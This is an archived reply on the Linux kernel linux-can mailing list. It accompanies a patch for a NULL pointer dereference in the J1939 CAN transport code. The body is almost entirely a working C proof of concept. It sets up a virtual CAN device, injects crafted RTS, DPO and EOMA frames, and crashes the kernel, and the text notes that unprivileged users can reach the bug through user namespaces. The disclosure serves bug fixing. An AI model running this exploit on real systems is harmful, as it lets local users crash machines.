Return-Path: <linux-can+bounces-7646-lists+linux-can=lfdr.de@vger.kernel.org>
Delivered-To: lists+linux-can@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id OJuaLXTkCWo6twQAu9opvQ
	(envelope-from <linux-can+bounces-7646-lists+linux-can=lfdr.de@vger.kernel.org>)
	for <lists+linux-can@lfdr.de>; Sun, 17 May 2026 17:53:24 +0200
X-Original-To: lists+linux-can@lfdr.de
Received: from tor.lore.kernel.org (tor.lore.kernel.org [IPv6:2600:3c04:e001:36c::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 344785622AF
	for <lists+linux-can@lfdr.de>; Sun, 17 May 2026 17:53:24 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by tor.lore.kernel.org (Postfix) with ESMTP id 391DA3006B01
	for <lists+linux-can@lfdr.de>; Sun, 17 May 2026 15:53:23 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 3255030C372;
	Sun, 17 May 2026 15:53:21 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="KbuxdfS0"
X-Original-To: linux-can@vger.kernel.org
Received: from mail-pj1-f44.google.com (mail-pj1-f44.google.com [209.85.216.44])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B18E033BBD0
	for <linux-can@vger.kernel.org>; Sun, 17 May 2026 15:53:19 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.44
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1779033201; cv=none; b=U6SsKWYi5VVyWEg6+nsOJ2f8A54WszCQXi+sriJbkYeGJ4FJebpV0R3z0Grqc/keXvTxn8xj0preWiAavmHiyFCdni7uLK4keMTTkwWBRVnihhzKOD9l4TdSL62wH6biE+NJP97VSsxXPQSqcJL8yyTZjvH+asHNhIT/nJMm/78=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1779033201; c=relaxed/simple;
	bh=//1Hpt/NWeCHMneofpAfEioi7gVZIUkcpEWLylSwW6E=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=pYpiu1w0/ntlSnLzDo2t/YOAPGUWxWUAxwk+QKUhdB2hMfnB8Pp5DvoUr6iBa+haYwuErvDuxZWkMcwTr9zHObPyN9VC5/imCMgJsYAeJ2SGZaTw3GgUZRx82CYbGm6HvTmnjI5S1twLgfdO5nyeCxREKE3L8WrlrCoYsHX+wfc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=KbuxdfS0; arc=none smtp.client-ip=209.85.216.44
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-pj1-f44.google.com with SMTP id 98e67ed59e1d1-369002b26f4so620829a91.3
        for <linux-can@vger.kernel.org>; Sun, 17 May 2026 08:53:19 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1779033199; x=1779637999; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=ymlIIMIafxR0PClEw/WjUbF3gekBktE5IfqoLX901II=;
        b=KbuxdfS0QKmlcekv/sg9qXMQznFXGCzCo8OhNUroQrOqkd7nwXCh4Il22lDV30Bumg
         FG3+pJFOtvxVARkYieBQCaU6zYlFd4zReehQwknLWd+xxrzG1XNMTD7iDx2/sOfZxSth
         vSs8rvdeTIy0ALhlg1DnJDP1VOupjhu68LIQGA0YdyVNXZH8K7fjDzVKMGaRCt65Gh77
         pmSpH4uX8haHxLOR3+2SDAFK2QaEofFEVGITJcVDeHhRLvSZyNlqX4Mb5/mPNu22u06C
         6MT/Ej04E+p7vjmV3qFz8mtevBsrYQCFElRyxIk+1+dczU2rxoXprSNHX59K6/iWO3rj
         /1+A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1779033199; x=1779637999;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=ymlIIMIafxR0PClEw/WjUbF3gekBktE5IfqoLX901II=;
        b=kjkpP4CaCfmNXUjQ6pq+COH7TNIDceLAIYkLLBFTZ/bHacSru6Z4n7C6VrY/t0FJhE
         a3K/bm/vPK+sQC2MEu3VNVD1EzdPsUy58VkskKFUyAyWQifg7dxQulkFyYHqMkEHoV23
         i71m6EfYSAYuUAxmQJmcnHL5qmd/zeopVjixOx0VrjiDZisrEoeyzHA7QDvzc1i0aiGA
         0pp7/r1PJxNP4rzczm5dg07ni5+9H43iKdc86NfaGadQWS6/7ytINjChMp9hZQX7Nxdu
         BqKdSOJNcO/MIRpWNWyaqlMoZolgNSJwFPoVN1w0v/xDT5m8FjQjPVaBSXWwzFs70ymE
         pnzw==
X-Forwarded-Encrypted: i=1; AFNElJ/orVfw8mo+6uKcZv+TGtGeYAJr6fGyHZX2HDwCxYNxXV1yXGbAmyKUvFak4+hvEFzFcXlylBhnbyc=@vger.kernel.org
X-Gm-Message-State: AOJu0YzGu+47gLn9mvY8ENiqYMqKH5WhLptwAN7C4l0i60+/AeRY6ojL
	VbRoJBudVcaA2Hv5jp355v7THztfbShc0/W+HYEbxBmiuBrxa26c8Qd6
X-Gm-Gg: Acq92OEgABlt1evADpiCOw1D40izfegN68ukeazHox/GrtFh1cSXHtgOb6jMvlAttGG
	hXKbiw6nKbpW/bfsAJT9ErXchUMkZrzspAYzRbw/WOU+fij3LTIAg+9MW0iJLSwYfMIw9kpTzG8
	RuwjLaRPmVsSUNkeP8CXHVUt3zi8BzBqdyKY7d/mV77MuxSVVOUcmJA+giMcqAR1oceHN0YTFu6
	pOygZILg2YAv/Eo0ay6K6VaGpNPoSI92We1NGhKVXzzfsXv+9Rcit/xic1SMyiuhPZb5yc9vyyD
	alP2atgj2fG86cpkk8n/yOo/jvYNdjrpn+vux7ka1x9W1jzO7VLAx0BFmLVvNSBOB7Su0M9K5Ja
	nL8nRHfTq75okxwRgf1lHP/HE4wG1W/R/5WmyWkPl4jgCjof3vFdrMUYWCUrJzMgsNmw1v3C1Tp
	Mw4WHg0L6pCA/hxO/C92f1/0lA8xutVPZERYoIc9YxoAFDRX2d+Bp6hve5C4LQPA==
X-Received: by 2002:a17:90b:3e81:b0:366:decb:d119 with SMTP id 98e67ed59e1d1-369519cc0demr12126219a91.11.1779033198902;
        Sun, 17 May 2026 08:53:18 -0700 (PDT)
Received: from Air.local ([198.176.50.157])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3695a160682sm3039225a91.14.2026.05.17.08.53.15
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 17 May 2026 08:53:18 -0700 (PDT)
Date: Sun, 17 May 2026 23:53:12 +0800
From: Weiming Shi <bestswngs@gmail.com>
To: Robin van der Gracht <robin@protonic.nl>, 
	Oleksij Rempel <o.rempel@pengutronix.de>, Oliver Hartkopp <socketcan@hartkopp.net>, 
	Marc Kleine-Budde <mkl@pengutronix.de>
Cc: Bastian Stender <bst@pengutronix.de>, 
	Maxime Jayat <maxime.jayat@mobile-devices.fr>, linux-can@vger.kernel.org, Xiang Mei <xmei5@asu.edu>
Subject: Re: [PATCH] can: j1939: fix NULL pointer dereference in
 j1939_session_completed()
Message-ID: <agnjbpTXcHVDuV-F@Air.local>
References: <20260517154426.4046979-2-bestswngs@gmail.com>
Precedence: bulk
X-Mailing-List: linux-can@vger.kernel.org
List-Id: <linux-can.vger.kernel.org>
List-Subscribe: <mailto:linux-can+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-can+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260517154426.4046979-2-bestswngs@gmail.com>
X-Rspamd-Queue-Id: 344785622AF
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [-2.16 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c04:e001:36c::/64:c];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	DKIM_TRACE(0.00)[gmail.com:+];
	TO_DN_SOME(0.00)[];
	MIME_TRACE(0.00)[0:+];
	TAGGED_FROM(0.00)[bounces-7646-lists,linux-can=lfdr.de];
	RCVD_TLS_LAST(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	MISSING_XM_UA(0.00)[];
	FROM_HAS_DN(0.00)[];
	FREEMAIL_FROM(0.00)[gmail.com];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[bestswngs@gmail.com,linux-can@vger.kernel.org];
	ASN(0.00)[asn:63949, ipnet:2600:3c04::/32, country:SG];
	NEURAL_HAM(-0.00)[-0.999];
	TAGGED_RCPT(0.00)[linux-can];
	RCPT_COUNT_SEVEN(0.00)[8];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[tor.lore.kernel.org:helo,tor.lore.kernel.org:rdns]
X-Rspamd-Action: no action

Required key configs for the poc:

- CONFIG_CAN=y 
- CONFIG_CAN_J1939=y/m 
- CONFIG_CAN_VCAN=y/m 
- CONFIG_USER_NS=y 

When CONFIG_USER_NS=y, an unprivileged user can trigger this vulnerability 
by calling unshare(CLONE_NEWUSER | CLONE_NEWNET) to enter a new user and network
 namespace, which grants CAP_NET_RAW without requiring root privileges.


```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/can.h>
#include <linux/can/raw.h>
#include <linux/can/j1939.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_link.h>

#define J1939_ETP_PGN_CTL  0xc800u
#define J1939_ETP_CMD_RTS  0x14
#define J1939_ETP_CMD_DPO  0x16
#define J1939_ETP_CMD_EOMA 0x17

#define LOCAL_ADDR  0x80
#define REMOTE_ADDR 0x42
#define INNER_PGN   0x0f000u
#define MSG_TOTAL   1792

static void rta_add(struct nlmsghdr *nh, int max, int type,
		    const void *data, int len)
{
	int rta_len = RTA_LENGTH(len);
	struct rtattr *rta = (struct rtattr *)((char *)nh + NLMSG_ALIGN(nh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = rta_len;
	if (data && len) memcpy(RTA_DATA(rta), data, len);
	nh->nlmsg_len = NLMSG_ALIGN(nh->nlmsg_len) + RTA_ALIGN(rta_len);
}

static struct rtattr *rta_nest(struct nlmsghdr *nh, int type)
{
	struct rtattr *rta = (struct rtattr *)((char *)nh + NLMSG_ALIGN(nh->nlmsg_len));
	rta->rta_type = type | NLA_F_NESTED;
	rta->rta_len = RTA_LENGTH(0);
	nh->nlmsg_len = NLMSG_ALIGN(nh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
	return rta;
}

static void rta_nest_end(struct nlmsghdr *nh, struct rtattr *rta)
{
	rta->rta_len = (char *)nh + nh->nlmsg_len - (char *)rta;
}

static int create_vcan(const char *name)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0) return -1;

	char buf[1024];
	memset(buf, 0, sizeof(buf));
	struct nlmsghdr *nh = (struct nlmsghdr *)buf;
	struct ifinfomsg *ifm;

	nh->nlmsg_len   = NLMSG_LENGTH(sizeof(*ifm));
	nh->nlmsg_type  = RTM_NEWLINK;
	nh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	nh->nlmsg_seq   = 1;
	ifm = NLMSG_DATA(nh);
	ifm->ifi_family = AF_UNSPEC;

	rta_add(nh, sizeof(buf), IFLA_IFNAME, name, strlen(name) + 1);
	struct rtattr *linfo = rta_nest(nh, IFLA_LINKINFO);
	rta_add(nh, sizeof(buf), IFLA_INFO_KIND, "vcan", 5);
	rta_nest_end(nh, linfo);

	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	struct iovec iov = { .iov_base = nh, .iov_len = nh->nlmsg_len };
	struct msghdr msg = { .msg_name = &sa, .msg_namelen = sizeof(sa),
			      .msg_iov = &iov, .msg_iovlen = 1 };
	sendmsg(fd, &msg, 0);

	char rbuf[4096];
	recv(fd, rbuf, sizeof(rbuf), 0);
	close(fd);
	return 0;
}

static int set_link_up(const char *name)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0) return -1;

	int idx = if_nametoindex(name);
	if (!idx) { close(fd); return -1; }

	char buf[256];
	memset(buf, 0, sizeof(buf));
	struct nlmsghdr *nh = (struct nlmsghdr *)buf;
	struct ifinfomsg *ifm;

	nh->nlmsg_len   = NLMSG_LENGTH(sizeof(*ifm));
	nh->nlmsg_type  = RTM_NEWLINK;
	nh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nh->nlmsg_seq   = 2;
	ifm = NLMSG_DATA(nh);
	ifm->ifi_family = AF_UNSPEC;
	ifm->ifi_index  = idx;
	ifm->ifi_change = IFF_UP;
	ifm->ifi_flags  = IFF_UP;

	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	struct iovec iov = { .iov_base = nh, .iov_len = nh->nlmsg_len };
	struct msghdr msg = { .msg_name = &sa, .msg_namelen = sizeof(sa),
			      .msg_iov = &iov, .msg_iovlen = 1 };
	sendmsg(fd, &msg, 0);

	char rbuf[4096];
	recv(fd, rbuf, sizeof(rbuf), 0);
	close(fd);
	return 0;
}

static uint32_t make_canid(uint32_t pgn, uint8_t da, uint8_t sa)
{
	uint32_t pri = 6;
	return CAN_EFF_FLAG | (pri << 26) | ((pgn & 0x3ff00) << 8) | ((uint32_t)da << 8) | sa;
}

static int send_etp_ctl(int fd, uint8_t cmd, uint32_t inner_pgn,
			uint8_t b1, uint8_t b2, uint8_t b3, uint8_t b4,
			uint8_t da, uint8_t sa)
{
	struct can_frame f = {0};
	f.can_id = make_canid(J1939_ETP_PGN_CTL, da, sa);
	f.len = 8;
	f.data[0] = cmd;
	f.data[1] = b1;
	f.data[2] = b2;
	f.data[3] = b3;
	f.data[4] = b4;
	f.data[5] = (inner_pgn >> 0) & 0xff;
	f.data[6] = (inner_pgn >> 8) & 0xff;
	f.data[7] = (inner_pgn >> 16) & 0xff;
	return write(fd, &f, sizeof(f));
}

int main(void)
{
	printf("[*] Sequential PoC - no race condition needed\n");

	if (create_vcan("vcan0") < 0) {
		fprintf(stderr, "[-] create_vcan failed\n");
		return 1;
	}
	if (set_link_up("vcan0") < 0) {
		fprintf(stderr, "[-] set_link_up failed\n");
		return 1;
	}

	int ifindex = if_nametoindex("vcan0");
	if (!ifindex) { fprintf(stderr, "[-] no vcan0\n"); return 1; }
	printf("[+] vcan0 ifindex=%d\n", ifindex);

	/* Bind J1939 socket at LOCAL_ADDR (0x80) - creates the "receiver" */
	int jsk = socket(PF_CAN, SOCK_DGRAM, CAN_J1939);
	if (jsk < 0) { perror("socket J1939"); return 1; }

	struct sockaddr_can jaddr = {0};
	jaddr.can_family = AF_CAN;
	jaddr.can_ifindex = ifindex;
	jaddr.can_addr.j1939.name = J1939_NO_NAME;
	jaddr.can_addr.j1939.addr = LOCAL_ADDR;
	jaddr.can_addr.j1939.pgn  = J1939_NO_PGN;
	if (bind(jsk, (struct sockaddr *)&jaddr, sizeof(jaddr)) < 0) {
		perror("bind LOCAL"); return 1;
	}
	printf("[+] J1939 bound at LOCAL=0x%x\n", LOCAL_ADDR);

	/* Bind second J1939 socket at REMOTE_ADDR (0x42) - makes it "local" too */
	int jsk2 = socket(PF_CAN, SOCK_DGRAM, CAN_J1939);
	if (jsk2 < 0) { perror("socket J1939 remote"); return 1; }

	struct sockaddr_can jaddr2 = {0};
	jaddr2.can_family = AF_CAN;
	jaddr2.can_ifindex = ifindex;
	jaddr2.can_addr.j1939.name = J1939_NO_NAME;
	jaddr2.can_addr.j1939.addr = REMOTE_ADDR;
	jaddr2.can_addr.j1939.pgn  = J1939_NO_PGN;
	if (bind(jsk2, (struct sockaddr *)&jaddr2, sizeof(jaddr2)) < 0) {
		perror("bind REMOTE"); return 1;
	}
	printf("[+] J1939 bound at REMOTE=0x%x\n", REMOTE_ADDR);

	/* Raw CAN socket for injecting frames */
	int rsk = socket(PF_CAN, SOCK_RAW, CAN_RAW);
	if (rsk < 0) { perror("socket RAW"); return 1; }

	int loopback = 1;
	setsockopt(rsk, SOL_CAN_RAW, CAN_RAW_LOOPBACK, &loopback, sizeof(loopback));

	struct sockaddr_can raddr = {0};
	raddr.can_family = AF_CAN;
	raddr.can_ifindex = ifindex;
	if (bind(rsk, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
		perror("bind RAW"); return 1;
	}
	printf("[+] Raw CAN socket ready\n");

	printf("\n[*] Step 1: Send RTS (REMOTE->LOCAL, size=%d)\n", MSG_TOTAL);
	uint32_t size = MSG_TOTAL;
	send_etp_ctl(rsk, J1939_ETP_CMD_RTS, INNER_PGN,
		     size & 0xff, (size >> 8) & 0xff,
		     (size >> 16) & 0xff, (size >> 24) & 0xff,
		     LOCAL_ADDR, REMOTE_ADDR);

	/* Wait for session to be created and RTS processed */
	usleep(50000);

	printf("[*] Step 2: Send malicious DPO (dpo=0x7FFFFF)\n");
	/* DPO frame: bytes 2-4 = 24-bit packet offset (little-endian) */
	/* j1939_etp_ctl_to_packet reads dat[2]|(dat[3]<<8)|(dat[4]<<16) */
	send_etp_ctl(rsk, J1939_ETP_CMD_DPO, INNER_PGN,
		     0x00,  /* number of packets to skip (ignored for our purpose) */
		     0xff, 0xff, 0x7f,  /* DPO bytes: 0xFF | (0xFF<<8) | (0x7F<<16) = 0x7FFFFF */
		     LOCAL_ADDR, REMOTE_ADDR);

	/* Wait for DPO to be fully processed */
	usleep(50000);

	printf("[*] Step 3: Send EOMA (LOCAL->REMOTE, triggers completion)\n");
	uint32_t eoma_size = MSG_TOTAL;
	send_etp_ctl(rsk, J1939_ETP_CMD_EOMA, INNER_PGN,
		     eoma_size & 0xff, (eoma_size >> 8) & 0xff,
		     (eoma_size >> 16) & 0xff, (eoma_size >> 24) & 0xff,
		     REMOTE_ADDR, LOCAL_ADDR);

	/* If we reach here, the kernel didn't crash */
	usleep(200000);
	printf("[-] No crash - kernel survived\n");

	close(rsk);
	close(jsk);
	close(jsk2);
	return 0;
}
```

